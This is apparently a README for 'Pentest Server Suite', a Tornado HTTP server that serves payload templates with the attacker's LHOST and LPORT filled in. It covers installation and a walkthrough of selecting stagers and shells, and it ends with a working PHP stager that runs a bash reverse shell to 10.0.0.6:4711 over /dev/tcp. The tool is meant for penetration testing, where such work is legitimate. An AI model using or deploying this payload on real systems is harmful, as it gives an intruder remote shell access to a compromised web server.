# Pentest Server Suite

A simple HTTP server based on Tornado that automatically adjusts "LHOST" and "LPORT" parameters in reverse shells and maybe more in the future. I plan to add SMB support as that's a frequently used way by me.

It uses simple templates and inserts variables into them.

## Install

Clone the repo:

```bash
git clone https://github.com/Jnnshschl/PentestServerSuite.git
```

Install dependecies:

```bash
pip install colorama tornado netifaces
```

Start the server:

```bash
python3 pss.py
```

Or with a different port and folder serving from current directory:

```bash
python3 pss.py -P 8080 --serve './'
```

## PHP Shell

Enter this into the pss shell:

```bash
stagers list
```

I'll use the "php/simple/system.php" and inject a simple bash reverse shell into it stager:

```bash
shells list
shells select bash_simple
```

Let's configure the selected shell:

```bash
shells options

set LHOST 10.0.0.6
# or by NIC name
set LHOST tun0
```

Now open "http://127.0.0.1/php/simple/system.php" in a browser or curl it, it should be the selected php system stager and contain a bash reverse shell.


```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.6/4711 0>&1'"); ?>
```
